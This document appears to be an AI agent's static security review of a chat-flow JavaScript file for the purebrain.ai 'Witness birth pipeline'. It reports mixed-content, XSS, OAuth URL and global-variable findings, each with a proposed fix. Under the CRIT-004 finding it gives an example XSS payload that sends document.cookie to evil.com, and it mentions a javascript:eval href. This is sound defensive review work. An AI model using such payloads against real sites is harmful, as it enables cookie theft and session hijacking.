# security-engineer-tech: Security Review — Witness Birth Pipeline (chatbox v4.1)

**Agent**: security-engineer-tech
**Domain**: Security Engineering
**Date**: 2026-02-24
**File Reviewed**: `exports/pay-test-script-chat-flow-v4.js`
**Review Type**: Pre-production static security analysis

---

## Executive Summary

The v4/v4.1 Witness birth pipeline introduces several security concerns of varying severity. The most critical issue is the mixed-content violation: the code makes plain HTTP calls to `http://104.248.239.98:8099` from an HTTPS page, which modern browsers block entirely. This is a **production blocker** — the feature will not function as written. Several additional issues exist across XSS exposure, OAuth URL handling, and global namespace design.

**Overall Verdict: BLOCKED — do not ship to production as-is**

The mixed-content issue alone prevents the Witness pipeline from functioning on purebrain.ai. Fix that first. The XSS issues (CRIT-003, HIGH-002) should be resolved in the same pass before any production deployment.

---

## Findings Summary

| ID | Severity | Title | Line(s) |
|----|----------|-------|---------|
| CRIT-003 | **Critical** | Mixed-content: HTTP calls from HTTPS page — browser will block | 1897, 1927, 2024, 2091 |
| CRIT-004 | **Critical** | XSS via unescaped `aiName` in `innerHTML` template literal | 1985–1987 |
| HIGH-002 | **High** | XSS via unescaped `oauthUrl` injected into `innerHTML` href | 1985 |
| HIGH-003 | **High** | `window._pbContainerName` is attacker-controllable — path injection risk | 1903–1905 |
| MED-001 | **Medium** | OAuth URL not validated before injection into DOM | 1943–1948, 1985 |
| MED-002 | **Medium** | Auth code has no format validation — any 5+ character string passes | 2007–2010 |
| MED-003 | **Medium** | `payTestData` and `logPayTestData` exposed on `window` — credential risk | 2265–2267 |
| LOW-001 | **Low** | `window._pbPrePurchaseSession` is attacker-injectable | 2200–2203 |
| LOW-002 | **Low** | `goal` field truncation leaks raw user input into `aiSay` innerHTML | 1239 |
| LOW-003 | **Low** | Container name slug uses firstName from untrusted user input | 1905 |
| INFO-001 | **Info** | Dead code `runClaudeMaxSetup` references console.log — minor hygiene | 1648 |

---

## Detailed Findings

---

### CRIT-003 — Critical: Mixed-Content Violation (Production Blocker)

**Lines**: 1897, 1927, 2024, 2091–2092

**Evidence**:
```javascript
// Line 1897
const WITNESS_WEBHOOK_HOST = 'http://104.248.239.98:8099';

// Line 1927 — fetch to plain HTTP
const startResp = await fetch(`${WITNESS_WEBHOOK_HOST}/api/birth/start`, { ... });

// Line 2024
const codeResp = await fetch(`${WITNESS_WEBHOOK_HOST}/api/birth/code`, { ... });

// Line 2091–2092
const resp = await fetch(
  `${WITNESS_WEBHOOK_HOST}/api/birth/portal-status/${encodeURIComponent(containerName)}`,
  ...
);
```

**Impact**: purebrain.ai is served over HTTPS. Modern browsers (Chrome, Firefox, Safari) enforce mixed-content policy: they **silently block or error** all `fetch()` calls to plain HTTP origins from HTTPS pages. This means `runBirthInit()` and `runPortalButtonWatcher()` will never successfully contact Witness. The birth pipeline is completely non-functional on production as written.

**The CTO decision noted in the brief** was to proxy all Witness calls through `https://api.purebrain.ai/api/birth/*` — this decision was not implemented.

**Fix**: Change `WITNESS_WEBHOOK_HOST` to `'https://api.purebrain.ai'` and ensure the `api.purebrain.ai` proxy routes these paths to the Witness server. No other code changes are needed for the URLs because the path structure (`/api/birth/start`, `/api/birth/code`, `/api/birth/portal-status/{container}`) can be preserved on the proxy.

```javascript
// Replace line 1897:
const WITNESS_WEBHOOK_HOST = 'https://api.purebrain.ai';
```

---

### CRIT-004 — Critical: XSS via `aiName` Injected into `innerHTML`

**Lines**: 1985–1987

**Evidence**:
```javascript
// Lines 1980–1992 — oauthMsg.innerHTML template literal
oauthMsg.innerHTML = `
  <div class="ptc-avatar"><div class="ptc-avatar-inner">
    <img src="..." alt="">
  </div></div>
  <div class="ptc-bubble" style="...">
    <a class="ptc-link-btn" href="${oauthUrl}" target="_blank" rel="noopener"
       onclick="this.textContent='Opened \u2713 — come back here with the code'; this.style.background='#4caf50';">
      Authorize ${aiName}\u2019s AI Brain \u2192   ← INJECTION POINT
    </a>
    ...
  </div>`;
```

`aiName` comes from the caller of `initPayTestFlow(chatContainer, aiName, ...)`. If the page passes an attacker-controlled `aiName` value (e.g., from a URL parameter or a tampered script tag), it will be injected into the DOM as raw HTML.

**Example attack**: If `aiName` is set to `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>`, that string is injected verbatim into the innerHTML template. This executes attacker JavaScript in the context of purebrain.ai.

Note: `aiName` is also used extensively in `aiSay()` calls (lines 1068–2158), which do `bubble.innerHTML = text.replace(/\n/g, '<br>')`. This is the same pattern. Any `aiSay` call that interpolates `aiName` into the `text` argument is an XSS risk if `aiName` is not sanitized.

**Fix**: Sanitize `aiName` (and `firstName`) at the entry point before they are stored:

```javascript
// In initPayTestFlow, after line 2191:
function sanitizeText(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML; // Returns HTML-escaped version
}

aiName = sanitizeText(aiName || 'Pure');
```

For the specific `oauthMsg.innerHTML` block, use `textContent` assignment for the link text rather than template literal injection:

```javascript
const oauthLink = document.createElement('a');
oauthLink.className = 'ptc-link-btn';
oauthLink.href = safeOauthUrl; // see MED-001 fix
oauthLink.target = '_blank';
oauthLink.rel = 'noopener';
oauthLink.textContent = `Authorize ${aiName}\u2019s AI Brain \u2192`;
// ... append via DOM API, not innerHTML
```

---

### HIGH-002 — High: OAuth URL Injected into `innerHTML` Href Without Sanitization

**Lines**: 1947–1948, 1985

**Evidence**:
```javascript
// Line 1947 — no validation before storage
oauthUrl = startData.oauth_url;

// Line 1985 — injected directly into innerHTML href attribute
<a class="ptc-link-btn" href="${oauthUrl}" target="_blank" rel="noopener"
```

`oauthUrl` comes from the Witness server response (line 1941: `startData.oauth_url`). There is no validation that this URL is a legitimate claude.ai OAuth URL before it is injected into the DOM as an href.

**Attack vector**: If the Witness server is compromised (possible given it runs on a raw IP `104.248.239.98`), or if the Witness API returns a manipulated response, `oauthUrl` could be set to `javascript:eval(atob('...'))` or a phishing URL. This href is then clicked by the end user. A `javascript:` scheme href executes arbitrary code in the page context.

Note: The `portalUrl` validation at lines 2135–2143 **correctly** validates the portal URL (HTTPS only, hostname ending in `purebrain.ai`). The same pattern must be applied to `oauthUrl`.

**Fix**: Validate `oauthUrl` before use:

```javascript
// After line 1947:
oauthUrl = startData.oauth_url;

// Validate — must be HTTPS and originate from claude.ai or anthropic.com
try {
  const parsedOauthUrl = new URL(oauthUrl);
  if (parsedOauthUrl.protocol !== 'https:' ||
      !['claude.ai', 'anthropic.com'].some(d => parsedOauthUrl.hostname.endsWith(d))) {
    throw new Error('Invalid OAuth URL domain');
  }
} catch (_) {
  throw new Error('Witness returned an invalid OAuth URL');
}
```

---

### HIGH-003 — High: `window._pbContainerName` is Attacker-Controllable

**Lines**: 1903–1905

**Evidence**:
```javascript
const containerName = (window._pbContainerName && window._pbContainerName.trim())
  ? window._pbContainerName.trim()
  : `purebrain-${(firstName || 'user').toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 20)}`;
```

`window._pbContainerName` is a global JavaScript variable. Any browser extension, injected script, third-party tag, or XSS payload on the purebrain.ai domain can overwrite this value before `runBirthInit()` executes.

`containerName` is then used:
1. In the POST body sent to `/api/birth/start` and `/api/birth/code` (lines 1930, 2027)
2. In the URL path of the GET to `/api/birth/portal-status/{container}` (line 2092 — though `encodeURIComponent` is correctly applied here)

**Impact**: An attacker could set `window._pbContainerName = 'victim-container-name'` and hijack another user's birth pipeline. They could also inject values that cause issues on the Witness server side if the server does not sanitize the container name.

**Fix 1**: Apply a strict allowlist to `containerName` regardless of source:

```javascript
const rawContainerName = (window._pbContainerName && window._pbContainerName.trim())
  ? window._pbContainerName.trim()
  : `purebrain-${(firstName || 'user').toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 20)}`;

// Enforce strict format: only lowercase alphanumeric and hyphens, max 40 chars
const containerName = rawContainerName.toLowerCase().replace(/[^a-z0-9-]/g, '').slice(0, 40);
if (!containerName) {
  throw new Error('Invalid container name');
}
```

**Fix 2** (architectural): Pass `containerName` as a parameter to `initPayTestFlow()` from a server-rendered value (e.g., in a signed data attribute on the page element), rather than relying on a globally mutable `window` property that any script can modify.

---

### MED-001 — Medium: OAuth URL Has No Format Validation Before DOM Injection

**Lines**: 1943–1948

**Evidence**:
```javascript
if (startData.status !== 'url_ready' || !startData.oauth_url) {
  throw new Error(`Unexpected start response: ${JSON.stringify(startData)}`);
}
oauthUrl = startData.oauth_url;
```

The only check is that `oauth_url` is truthy. A `javascript:` scheme value, a `data:` URI, or a relative path would all pass this check. This feeds directly into HIGH-002 above. Addressed by HIGH-002 fix.

---

### MED-002 — Medium: Auth Code Has No Format Validation

**Lines**: 2007–2010

**Evidence**:
```javascript
const authCode = await promptText(
  inputRow, textarea, sendBtn,
  (v) => v.trim().length > 4 && !/\n/.test(v.trim()),
);
```

The validator accepts any string of 5+ characters with no newlines. Claude.ai OAuth codes have a predictable format. Without enforcing that format, a user who accidentally pastes their Claude API key, a Telegram token, or other sensitive credential will have it accepted silently and sent to the Witness server.

**Fix**: Validate against the known Claude OAuth code format (consult with CTO/Witness team on the exact pattern). As a minimum safeguard:

```javascript
// Example: if Claude auth codes are alphanumeric 8–64 chars
(v) => /^[A-Za-z0-9_\-\.]{8,64}$/.test(v.trim())
```

This prevents accidental submission of clearly wrong credential types.

---

### MED-003 — Medium: `payTestData` and `logPayTestData` Exposed Globally

**Lines**: 2265–2267

**Evidence**:
```javascript
} else if (typeof window !== 'undefined') {
  window.initPayTestFlow = initPayTestFlow;
  window.payTestData     = payTestData;    // ← exposed
  window.logPayTestData  = logPayTestData; // ← exposed
}
```

`window.payTestData` exposes the entire data store to any script running on the page — including third-party analytics, browser extensions, and injected scripts. The data store contains `email`, `name`, `company`, `role`, `primaryGoal`, `claudeMaxStatus`, and crucially `containerName` and `birthOauthUrl`.

Although `claudeSessionInfo` (Claude API key) and `telegramBotToken` are stripped in `logPayTestData()`, they remain readable directly from `window.payTestData.claudeSessionInfo` and `window.payTestData.telegramBotToken` at any point after the user enters them.

**Fix**: Remove `payTestData` and `logPayTestData` from the window exports. Only `initPayTestFlow` needs to be public:

```javascript
} else if (typeof window !== 'undefined') {
  window.initPayTestFlow = initPayTestFlow;
  // Do NOT export payTestData or logPayTestData — internal state only
}
```

---

### LOW-001 — Low: `window._pbPrePurchaseSession` Is Attacker-Injectable

**Lines**: 2200–2203, 111–113

**Evidence**:
```javascript
if (window._pbPrePurchaseSession) {
  payTestData.prePurchaseSessionId = window._pbPrePurchaseSession.sessionId;
  payTestData.prePurchaseHistory = window._pbPrePurchaseSession.conversationHistory;
  payTestData.prePurchaseMessageCount = window._pbPrePurchaseSession.messageCount;
}
```

Same issue as HIGH-003 — any script on the page can set this object. The conversation history ends up in the `messages` array sent to `https://api.purebrain.ai/api/log-conversation`. A malicious extension could inject fabricated conversation history into the log.

**Fix**: Add type and length validation on these fields before trusting them:

```javascript
if (window._pbPrePurchaseSession &&
    typeof window._pbPrePurchaseSession.sessionId === 'string' &&
    Array.isArray(window._pbPrePurchaseSession.conversationHistory)) {
  // Validate sessionId format
  const sessionId = window._pbPrePurchaseSession.sessionId.slice(0, 64).replace(/[^\w\-]/g, '');
  // Validate history entries
  const safeHistory = window._pbPrePurchaseSession.conversationHistory
    .slice(0, 100)
    .filter(m => m && typeof m.role === 'string' && typeof m.content === 'string')
    .map(m => ({ role: m.role.slice(0, 20), content: m.content.slice(0, 2000) }));
  payTestData.prePurchaseSessionId = sessionId;
  payTestData.prePurchaseHistory = safeHistory;
  payTestData.prePurchaseMessageCount = safeHistory.length;
}
```

---

### LOW-002 — Low: `goal` Field Raw User Input Rendered in `aiSay` innerHTML

**Line**: 1239

**Evidence**:
```javascript
await aiSay(
  msgList,
  `"${goal.length > 80 ? goal.slice(0, 80) + '\u2026' : goal}"<br><br>` +
  `${firstName}, that's exactly the kind of clarity ${aiName} needed. ` +
  ...
);
```

`goal` is raw user input from `promptText()`. `aiSay()` renders its `text` argument via `bubble.innerHTML = text.replace(/\n/g, '<br>')` (line 942). If `goal` contains `<script>`, `<img onerror=...>`, or other HTML, it will execute.

Note: This is partially mitigated if `aiName` sanitization (CRIT-004 fix) is applied globally. However `goal` is user-typed input, which is a more direct attack vector.

**Fix**: Apply HTML escaping to user-supplied values before interpolating them into aiSay text:

```javascript
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// Line 1239 becomes:
const safeGoalExcerpt = escapeHtml(goal.length > 80 ? goal.slice(0, 80) + '\u2026' : goal);
await aiSay(
  msgList,
  `"${safeGoalExcerpt}"<br><br>` + ...
);
```

The same pattern should be applied to: `company` (line 1115), `role` (line 1136), and `firstName` in aiSay calls.

---

### LOW-003 — Low: Container Name Fallback Derived from User-Typed `firstName`

**Line**: 1905

**Evidence**:
```javascript
const containerName = (window._pbContainerName && window._pbContainerName.trim())
  ? window._pbContainerName.trim()
  : `purebrain-${(firstName || 'user').toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 20)}`;
```

`firstName` is derived from `payTestData.name.split(' ')[0]`, where `name` is user input. The `.replace(/[^a-z0-9]/g, '')` strip does sanitize aggressively, removing all non-alphanumeric characters. The `.slice(0, 20)` length cap also limits abuse. This is handled reasonably well. The residual risk is that two users with the same first name who go through the flow at similar times might get the same container name if `window._pbContainerName` is not set. This is a logic collision concern more than a security vulnerability.

**Recommendation**: Append a short random suffix or the `orderId` when constructing the fallback:

```javascript
const safeSuffix = (payTestData.orderId || Date.now().toString(36)).slice(-6);
const containerName = (window._pbContainerName && window._pbContainerName.trim())
  ? window._pbContainerName.trim().toLowerCase().replace(/[^a-z0-9-]/g, '').slice(0, 40)
  : `purebrain-${(firstName || 'user').toLowerCase().replace(/[^a-z0-9]/g, '').slice(0, 14)}-${safeSuffix}`;
```

---

### INFO-001 — Info: Dead Code `runClaudeMaxSetup` Contains Console.log

**Lines**: 1644–1649

**Evidence**:
```javascript
async function runClaudeMaxSetup(dom, aiName, firstName) {
  console.log('[pay-test-chat-flow-v4] runClaudeMaxSetup called but is dead code in v3+');
}
```

This function is documented as dead code and never called from the main flow. No security risk, but it signals to anyone reading the minified source that this endpoint exists and was previously part of the flow. Recommend removing it before shipping to reduce attack surface knowledge disclosure.

---

## Positive Security Observations

The following security controls are well-implemented and should be preserved:

1. **CRIT-001 handled correctly** (line 87): `logPayTestData()` strips `claudeSessionInfo` and `telegramBotToken` before transmission to the logging endpoints via destructuring assignment. This is the right approach.

2. **CRIT-002 handled correctly** (lines 1189–1192, 1604–1606): Both the Claude API key and the Telegram bot token are masked in the chat bubble UI before being passed to `userSay()`. Users only see the prefix and bullet characters.

3. **Portal URL validation done correctly** (lines 2135–2143): The `portalUrl` from the Witness `portal-status` response is validated for HTTPS protocol and `purebrain.ai` hostname before being set as an `href`. This is good defensive practice.

4. **`rel="noopener"` consistently applied** on all `target="_blank"` links — prevents tab-napping attacks.

5. **AbortController with timeouts** on both Witness fetch calls (180s and 120s) prevents indefinite hanging.

6. **Bot token format validated** with a solid regex at line 1392 before acceptance.

7. **`encodeURIComponent`** applied to `containerName` in the portal-status GET URL (line 2092) — correct path encoding.

8. **User messages use `textContent`** in `userSay()` (line 966), preventing XSS from user-typed input in the user bubble. This is the right pattern that should be extended to AI message construction as well.

---

## Recommended Fix Priority (Pre-Production Checklist)

| Priority | Action | Blocking? |
|----------|--------|-----------|
| P0 | Change `WITNESS_WEBHOOK_HOST` to HTTPS proxy (`https://api.purebrain.ai`) | YES — feature dead without this |
| P0 | Sanitize `aiName` at entry point; use DOM API for link text instead of innerHTML | YES — XSS |
| P0 | Validate `oauthUrl` for HTTPS + claude.ai domain before DOM injection | YES — XSS / phishing |
| P1 | Apply strict allowlist to `containerName` regardless of source | Recommended before ship |
| P1 | Remove `payTestData` and `logPayTestData` from `window` exports | Recommended before ship |
| P2 | Add format validation to auth code input | Ship-with |
| P2 | Escape `goal`, `company`, `role`, `firstName` when interpolated into aiSay HTML | Ship-with |
| P3 | Add random suffix to fallback container name | Post-ship |
| P3 | Remove dead `runClaudeMaxSetup` function | Post-ship / cleanup |
| P3 | Validate `window._pbPrePurchaseSession` fields before use | Post-ship |

---

## Memory Written

Path: `.claude/memory/agent-learnings/security-engineer-tech/2026-02-24--witness-birth-pipeline-v4-review.md`
Type: operational
Topic: Witness birth pipeline v4/v4.1 security review — mixed-content, XSS via innerHTML template literals, global namespace exposure

---

*Review completed by security-engineer-tech | 2026-02-24*
*Static analysis only — no external systems contacted*
